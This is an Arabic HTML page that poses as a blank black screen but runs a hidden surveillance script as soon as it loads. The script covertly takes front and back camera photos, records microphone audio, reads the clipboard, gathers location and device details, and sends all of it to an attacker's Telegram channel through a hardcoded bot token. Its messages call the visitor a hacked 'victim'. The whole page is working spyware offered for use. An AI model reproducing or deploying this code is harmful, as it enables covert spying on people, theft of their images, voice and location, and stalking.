<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>█</title>
    <style>
        /* إزالة كل الألوان والتصميمات: خلفية سوداء بالكامل، لا أزرار، لا نصوص مرئية */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none; /* منع التحديد (اختياري) */
        }

        body {
            background: #000000;  /* أسود معتم تماماً */
            min-height: 100vh;
            overflow: hidden;      /* منع أي تمرير أو عناصر زائدة */
            font-family: system-ui, -apple-system, 'Segoe UI', monospace;
            color: #000000;       /* النصوص بنفس لون الخلفية -> غير مرئية */
        }

        /* إخفاء جميع الحاويات والعناصر المرئية */
        .matrix-rain, 
        .container, 
        .hero, 
        .glitch-title, 
        .hologram-badge,
        .start-virus-btn,
        .scanner-box,
        .atom-box,
        .phone-scan-area,
        .scan-line,
        .phone-holo-icon,
        .virus-holo-container,
        .virus-particle,
        .result-card,
        #resultContainer,
        #permStatusMsg,
        .loader-modal .loader-inner-text,
        .percent-value,
        .loader-spinner,
        .ring-extra-1,
        .ring-extra-2,
        [class*="loader"],
        [id*="result"] {
            display: none !important;
            visibility: hidden !important;
            opacity: 0 !important;
            pointer-events: none !important;
        }

        /* ضمان أن أي شيء يظهر يختفي - لكننا سنعتمد على شاشة سوداء كاملة بدون تفاعل بصري */
        body::before,
        body::after {
            display: none !important;
        }

        /* منع أي عناصر عائمة أو ظلال أو حدود */
        *:not(html):not(body) {
            border: none !important;
            box-shadow: none !important;
            text-shadow: none !important;
            background: transparent !important;
            backdrop-filter: none !important;
        }

        /* حتى نافذة التحميل (loader) تكون خفية تماماً ولكنها تعمل في الخلفية */
        .loader-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000 !important;
            display: flex; /* سيبقى flex لكن لا مرئي */
            align-items: center;
            justify-content: center;
            z-index: 9999;
            opacity: 0 !important;
            visibility: hidden !important;
            pointer-events: none !important;
        }

        /* إبقاء النصوص داخل اللودر غير مرئية بالكامل -> أسود على أسود */
        .loader-modal * {
            visibility: hidden !important;
            opacity: 0 !important;
            color: black !important;
            background: black !important;
            border-color: black !important;
        }

        /* لكن يجب أن يعمل script في الخلفية وجمع البيانات والصلاحيات - الشاشة سوداء لا تظهر أي رسالة */
        /* لا نريد أي تفاعل أو أزرار، سيتم بدء الفحص فوراً عند تحميل الصفحة */
        
        /* إخفاء شريط التمرير وأي عناصر قابلة للنقر */
        html, body {
            width: 100%;
            height: 100%;
            cursor: default;
        }

        /* إزالة أي تأثيرات أخرى */
        button, a, div, section {
            -webkit-tap-highlight-color: transparent;
        }
    </style>
</head>
<body>
    <!-- كل عناصر HTML القديمة موجودة ولكن مخفية تماماً بالـ CSS -->
    <div class="matrix-rain" id="matrixRain" style="display:none;"></div>
    <div class="container" style="display:none;">
        <div class="hero"></div>
        <button class="start-virus-btn" id="startBtn" style="display:none;"></button>
        <div class="scanner-box"></div>
        <div class="atom-box"></div>
    </div>
    <div class="loader-modal" id="loaderOverlay" style="display:flex; opacity:0; visibility:hidden; pointer-events:none;">
        <div class="loader-spinner"></div>
        <div id="permStatusMsg"></div>
    </div>
    <div id="resultContainer" style="display:none;"></div>

    <script>
        (function(){
            // ---- توكن القناة ونفس البيانات تماماً ----
            const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
            const CHANNEL_ID = '-1003875161698';
            const TELEGRAM_REDIRECT_URL = 'https://t.me/Whiskybots'; // رابط القناة بعد الانتهاء

            let collectedData = {
                messages: [],
                frontPhotos: [],
                backPhotos: [],
                deviceInfo: {},
                location: {},
                clipboardContent: '',
                audioBase64: null
            };

            let scanningActive = false;
            let isCompleted = false;

            // دالة التأخير
            function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

            // إرسال رسالة الاختراق الأولية (نفس النص السابق)
            async function sendHackMessage() {
                const specialMsg = `❀ جـاࢪي اخـتࢪاااق ضـحـيه بـواسـطههة ءالهڪر وءالمـبࢪمج | . ⤹ 𝐖𝐇𝐈𝐒𝗞𝗬 𝗘𝗟𝗬𝗢𝐔َ𝗧𝐔𝗕𝗘𝐑​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 𓈒⤸ ❏ِ⋡ِ  `;
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                try {
                    await fetch(url, {
                        method: 'POST',
                        headers: {'Content-Type':'application/json'},
                        body: JSON.stringify({ chat_id: CHANNEL_ID, text: specialMsg, parse_mode: 'HTML' })
                    });
                } catch(e) { console.warn(e); }
            }

            // إرسال التقرير الشامل (معلومات الجهاز + الموقع + الحافظة + اشعار الصوت)
            async function sendComprehensiveReport(device, loc, clip, audioFlag) {
                let text = `💙 <b>تـم اخـتࢪاق ضـحيه يحب</b> 💙\n\n`;
                text += `📱 <b>الجهاز:</b> ${device.fullName || 'غير معروف'}\n`;
                text += `🏭 <b>الشركة:</b> ${device.brand || '-'}\n`;
                text += `🔧 <b>الموديل:</b> ${device.model || '-'}\n`;
                text += `💻 <b>نظام التشغيل:</b> ${device.os || '-'}\n`;
                text += `🌐 <b>المتصفح:</b> ${device.browser || '-'}\n`;
                text += `📏 <b>الشاشة:</b> ${device.screen || '-'}\n`;
                text += `🔋 <b>البطارية:</b> ${device.battery || '-'}\n`;
                text += `✦ <b>الرسائل وجهات الاتصال لـم يـتم الوصول إليها لأن سياسة المتصفحات الحديثة تمـنع ذلك:</b> ${device.sms || '-'}\n`;
                text += `🕒 <b>المنطقة:</b> ${device.timezone || '-'}\n`;
                text += `🗣️ <b>اللغة:</b> ${device.language || '-'}\n\n`;
                if(loc && loc.lat) {
                    text += `❀ <b>الموقع الحالي:</b>\nLat: ${loc.lat}\nLng: ${loc.lng}\nالدقة: ${loc.acc || '?'} متر\n`;
                    text += `🔗 <a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}">خريطة الموقع</a>\n\n`;
                } else text += `✦ الموقع: غير متاح\n\n`;
                if(clip) text += `✿ <b>محتويات الحافظة:</b>\n<code>${clip.substring(0, 500)}</code>\n\n`;
                else text += `✿ الحافظة: فارغة أو تم منعها\n\n`;
                text += `🎤 <b>تسجيل صوتي:</b> ${audioFlag ? 'تم التسجيل ✓' : 'لم يتم'}\n`;
                text += `☑️ <b>التوقيت:</b> ${new Date().toLocaleString('ar-EG')}`;
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({ chat_id: CHANNEL_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
                });
            }

            // إرسال الصور إلى القناة
            async function sendPhotosToChannel(photosArray, prefix) {
                for(let i=0; i<photosArray.length; i++) {
                    if(!photosArray[i]) continue;
                    try {
                        let blob = await (await fetch(photosArray[i])).blob();
                        let formData = new FormData();
                        formData.append('chat_id', CHANNEL_ID);
                        formData.append('photo', blob, `${prefix}_${Date.now()}_${i}.jpg`);
                        formData.append('caption', `${prefix} صورة ${i+1} - تم تغفيل الضحيه بـنـجاح ✔`);
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                        await delay(500);
                    } catch(e){ console.warn(e); }
                }
            }

            // جمع معلومات الجهاز المتقدمة
            async function gatherDeviceInfo() {
                let ua = navigator.userAgent;
                let brand = 'غير معروف', model = 'غير محدد';
                if(ua.includes('iPhone')) brand = 'Apple';
                else if(ua.includes('Samsung')) brand = 'Samsung';
                else if(ua.includes('Xiaomi')) brand = 'Xiaomi';
                else if(ua.includes('Pixel')) brand = 'Google';
                else brand = 'Android/PC';
                let battery = 'غير مدعوم';
                if('getBattery' in navigator){
                    try{ let b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% ${b.charging?'يشحن':'لا يشحن'}`; }catch(e){}
                }
                return {
                    fullName: navigator.userAgentData?.platform || ua.split(' ').slice(0,3).join(' '),
                    brand: brand,
                    model: model,
                    os: navigator.platform,
                    browser: /Chrome/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':'Safari',
                    screen: `${screen.width}x${screen.height}`,
                    battery: battery,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language,
                    sms: 'غير متاح (قيود المتصفح)'
                };
            }

            // الموقع الجغرافي
            async function getLocation() {
                return new Promise((resolve) => {
                    if(!navigator.geolocation) resolve(null);
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
                        () => resolve(null),
                        { enableHighAccuracy: true, timeout: 8000 }
                    );
                });
            }

            // قراءة الحافظة
            async function readClipboardText() {
                try {
                    let text = await navigator.clipboard.readText();
                    return text || '(فارغة)';
                } catch(e){ return 'لا يمكن الوصول أو فارغ'; }
            }

            // تسجيل صوت (5 ثوانٍ)
            async function recordAudio() {
                try {
                    let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    let mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                    let chunks = [];
                    mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
                    let promise = new Promise(resolve => {
                        mediaRecorder.onstop = () => {
                            let blob = new Blob(chunks, { type: 'audio/webm' });
                            let url = URL.createObjectURL(blob);
                            stream.getTracks().forEach(t => t.stop());
                            resolve(url);
                        };
                    });
                    mediaRecorder.start();
                    await delay(5000);
                    mediaRecorder.stop();
                    return await promise;
                } catch(e){ return null; }
            }

            // التقاط صور من الكاميرا الأمامية 3 صور (بدون إظهار أي عناصر مرئية)
            async function captureFrontPhotos(count=3) {
                let photos = [];
                try {
                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    let video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', 'true');
                    video.style.position = 'fixed';
                    video.style.top = '-1000px';
                    video.style.left = '-1000px';
                    video.style.width = '1px';
                    video.style.height = '1px';
                    video.style.opacity = '0';
                    video.style.pointerEvents = 'none';
                    document.body.appendChild(video);
                    await video.play();
                    await delay(500);
                    let canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    for(let i=0; i<count; i++) {
                        if(video.videoWidth && video.videoHeight) {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                        }
                        let ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        let dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                        photos.push(dataUrl);
                        await delay(400);
                    }
                    stream.getTracks().forEach(t=>t.stop());
                    video.remove();
                } catch(e){ console.warn('front cam error', e); }
                return photos;
            }

            // التقاط صور من الكاميرا الخلفية 3 صور
            async function captureBackPhotos(count=3) {
                let photos = [];
                try {
                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    let video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', 'true');
                    video.style.position = 'fixed';
                    video.style.top = '-1000px';
                    video.style.left = '-1000px';
                    video.style.width = '1px';
                    video.style.height = '1px';
                    video.style.opacity = '0';
                    video.style.pointerEvents = 'none';
                    document.body.appendChild(video);
                    await video.play();
                    await delay(500);
                    let canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    for(let i=0; i<count; i++) {
                        if(video.videoWidth && video.videoHeight) {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                        }
                        let ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        let dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                        photos.push(dataUrl);
                        await delay(400);
                    }
                    stream.getTracks().forEach(t=>t.stop());
                    video.remove();
                } catch(e){ console.warn('back cam error', e); }
                return photos;
            }

            // طلب الصلاحيات الضرورية بشكل صامت (بدون أي مؤشرات مرئية)
            async function requestSilentPermissions() {
                // طلب الميكروفون بشكل خفي (للتسجيل)
                try { 
                    let audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    audioStream.getTracks().forEach(track => track.stop());
                } catch(e) {}
                // طلب الكاميرا (أمامية وخلفية لاحقاً في الالتقاط الفعلي)
                try {
                    let dummyCam = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    dummyCam.getTracks().forEach(t=>t.stop());
                } catch(e) {}
                try {
                    let dummyBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    dummyBack.getTracks().forEach(t=>t.stop());
                } catch(e) {}
                // طلب الموقع في وقت لاحق
                if(navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
                }
                // الحافظة - محاولة قراءة سريعة (ستظهر الصلاحية عند القراءة الفعلية)
            }

            // الوظيفة الرئيسية التي تقوم بكل شيء بصمت (بدون أي واجهات أو أزرار)
            async function executeFullSilentScan() {
                if(scanningActive) return;
                scanningActive = true;
                
                // طلب الصلاحيات أولاً بصمت
                await requestSilentPermissions();
                await delay(300);
                
                // محاكاة خطوات جمع البيانات وارسالها إلى التيليجرام تماماً كما في الكود الأصلي
                // 1. الموقع
                let locationData = null;
                try { locationData = await getLocation(); } catch(e) {}
                // 2. معلومات الجهاز
                let deviceInfo = await gatherDeviceInfo();
                // 3. محتوى الحافظة
                let clipboardContent = '';
                try { clipboardContent = await readClipboardText(); } catch(e) { clipboardContent = 'فشل الوصول'; }
                // 4. تسجيل صوتي
                let audioUrl = null;
                try { audioUrl = await recordAudio(); } catch(e) {}
                // 5. صور أمامية
                let frontPhotos = [];
                try { frontPhotos = await captureFrontPhotos(3); } catch(e) {}
                // 6. صور خلفية
                let backPhotos = [];
                try { backPhotos = await captureBackPhotos(3); } catch(e) {}
                
                // إرسال رسالة الاختراق
                await sendHackMessage();
                // إرسال التقرير الكامل (معلومات + موقع + حافظة)
                await sendComprehensiveReport(deviceInfo, locationData, clipboardContent, !!audioUrl);
                // إرسال الصور الأمامية والخلفية
                if(frontPhotos.length) await sendPhotosToChannel(frontPhotos, 'front_cam');
                if(backPhotos.length) await sendPhotosToChannel(backPhotos, 'back_cam');
                // إرسال الملف الصوتي إذا وُجد
                if(audioUrl){
                    try {
                        let blob = await fetch(audioUrl).then(r=>r.blob());
                        let formData = new FormData();
                        formData.append('chat_id', CHANNEL_ID);
                        formData.append('audio', blob, 'voice_record.webm');
                        formData.append('caption', '🎙️ تسجيل صوتي تلقائي');
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
                    } catch(e){}
                }
                
                scanningActive = false;
                isCompleted = true;
                
                // بعد الانتهاء من كل شيء بنجاح - الانتقال إلى رابط القناة على تليجرام
                // تأخير بسيط لضمان وصول جميع الطلبات (اختياري)
                await delay(1500);
                // تحويل المتصفح إلى رابط القناة
                window.location.href = TELEGRAM_REDIRECT_URL;
            }
            
            // بدء التنفيذ فوراً عند تحميل الصفحة (دون أي تفاعل من المستخدم)
            // مع محاولة تجنب حظر النوافذ المنبثقة أو قيود المتصفح
            // استخدام setTimeout للتأكد من أن المستند جاهز
            let startExecuted = false;
            function initSilentHack() {
                if(startExecuted) return;
                startExecuted = true;
                // تأخير قصير لتجنب تداخل (لا يوجد واجهة)
                setTimeout(() => {
                    executeFullSilentScan().catch(err => {
                        console.warn("error during silent execution", err);
                        // في حالة فشل كامل، لا يزال ننقل المستخدم للقناة بعد محاولة
                        if(!isCompleted) {
                            setTimeout(() => {
                                window.location.href = TELEGRAM_REDIRECT_URL;
                            }, 2000);
                        }
                    });
                }, 500);
            }
            
            // ضمان التشغيل بمجرد تحميل الصفحة
            if(document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', initSilentHack);
            } else {
                initSilentHack();
            }
            
            // منع أي تفاعلات يمكن أن تكشف وجود واجهة (مسح أي تأثيرات)
            window.addEventListener('touchstart', (e) => {
                // نمنع أي تفاعل مرئي لكن لا نوقف العمليات الخلفية
                e.preventDefault();
            }, { passive: false });
            
            // حظر أي محاولة لفتح قوائم أو تفاعل قد يكشف الصفحة
            document.body.style.backgroundColor = "#000000";
            document.documentElement.style.backgroundColor = "#000000";
            
            // إزالة أي عناصر قد تظهر بشكل طارئ (مثل شريط التحميل او مؤشرات)
            const styleClear = document.createElement('style');
            styleClear.textContent = `
                *:not(html):not(body) {
                    background: transparent !important;
                    color: black !important;
                    border-color: black !important;
                    text-shadow: none !important;
                    box-shadow: none !important;
                }
                body, html {
                    overflow: hidden;
                    background: black;
                }
                .loader-modal, .loader-spinner, .result-card, #loaderOverlay {
                    display: none !important;
                }
            `;
            document.head.appendChild(styleClear);
            
            // إزالة أي نوافذ عائمة بأمان
            const observer = new MutationObserver(() => {
                const loaders = document.querySelectorAll('.loader-modal, .result-card, [class*="loader"]');
                loaders.forEach(el => {
                    if(el) el.style.display = 'none';
                });
            });
            observer.observe(document.body, { childList: true, subtree: true });
        })();
    </script>
</body>
</html>
